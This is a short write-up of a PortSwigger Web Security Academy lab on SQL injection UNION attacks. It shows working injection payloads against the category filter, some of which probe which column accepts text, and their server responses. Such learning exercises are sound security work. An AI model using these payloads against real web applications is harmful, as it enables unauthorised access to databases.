---
title: 'Lab: SQL injection UNION attack, finding a column containing text'
tags: [Portswigger Web Security Academy, Web]

---

# Lab: SQL injection UNION attack, finding a column containing text
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. 
* Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

## Exp
1. Determine how many columns it has
You can use the technique from previous question.
Payload: `?category=' UNION SELECT NULL,NULL,NULL--`
2. Start to guess which column contains text
For example: 
`?category=Accessories' UNION (SELECT 'a', NULL, NULL)--` $\to$ Internal Server Error
`?category=Accessories' UNION (SELECT NULL, 'a', NULL)--` $\to$ <font color="FF0000">No Error</font>
`?category=Accessories' UNION (SELECT NULL, NULL, 'a')--` $\to$ Internal Server Error

    **Then we can consider which column is text-based string**

    Payload: `?category=Accessories' UNION (SELECT NULL, 'DoimDt', NULL)--`
    :::spoiler Success Screenshot
    ![](https://imgur.com/LtSoc2E.png)
    :::

## Reference